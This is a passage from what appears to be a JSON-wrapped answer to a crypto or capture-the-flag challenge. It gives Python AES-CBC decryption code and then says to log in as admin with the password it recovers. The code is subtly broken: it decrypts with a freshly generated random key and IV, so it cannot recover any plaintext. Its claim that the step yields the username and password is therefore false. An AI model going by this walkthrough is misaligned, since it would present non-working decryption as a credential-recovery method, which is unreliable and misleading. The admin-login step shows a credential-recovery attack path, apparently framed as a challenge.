os\n\n     KEY = os.urandom(32)\n     IV = os.urandom(16)\n     cipher = AES.new(KEY, AES.MODE_CBC, iv=IV)\n     decrypted = unpad(cipher.decrypt(bytes.fromhex(ciphertext)), 16)\n     print(decrypted.decode())\n     ```\n   - This will give you access to both the username and password used in the encryption process.\n\n6. **Using the Password:**\n   - Once you have extracted the password, you can use it to authenticate as admin by calling the `admin_login` function with the recovered password."
	}
}